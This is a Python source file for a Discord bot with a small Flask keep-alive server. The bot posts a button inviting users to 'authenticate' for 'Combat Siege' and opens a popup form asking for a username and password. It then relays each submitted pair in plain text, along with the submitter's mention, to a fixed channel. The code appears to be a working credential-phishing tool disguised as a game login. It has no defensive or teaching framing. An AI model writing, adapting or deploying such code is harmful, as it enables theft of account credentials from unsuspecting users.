import os
import threading
from flask import Flask
import discord
from discord.ext import commands

# Initialize Flask app
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

threading.Thread(target=run_flask, daemon=True).start()

# Popup Form (Modal) for Username and Password
class CredentialsModal(discord.ui.Modal, title="Combat Siege Authentication"):
    username = discord.ui.TextInput(
        label="Username",
        placeholder="Enter your username...",
        required=True
    )
    password = discord.ui.TextInput(
        label="Password",
        placeholder="Enter your password...",
        required=True,
        style=discord.TextStyle.short
    )

    async def on_submit(self, interaction: discord.Interaction):
        # Send the entered username and password to your channel
        channel = interaction.client.get_channel(1558729581244977185)
        if channel:
            await channel.send(
                f"🚨 **New Credentials Submitted!**\n"
                f"• **Submitted by:** {interaction.user.mention}\n"
                f"• **Username:** `{self.username.value}`\n"
                f"• **Password:** `{self.password.value}`"
            )
        # Private confirmation message to the user
        await interaction.response.send_message("Your credentials have been submitted successfully!", ephemeral=True)

# Button View that triggers the popup
class ApproveView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)  # Persistent button

    @discord.ui.button(label="Enter Credentials", style=discord.ButtonStyle.green, custom_id="enter_creds_button")
    async def button_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(CredentialsModal())

# Discord Bot Setup
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

CHANNEL_ID = 1558729581244977185 

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    bot.add_view(ApproveView())  # Keep the button active
    
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send("Click below to log in / authenticate:", view=ApproveView())
    else:
        print(f"Could not find channel with ID {CHANNEL_ID}")

bot.run(os.environ.get("DISCORD_TOKEN"))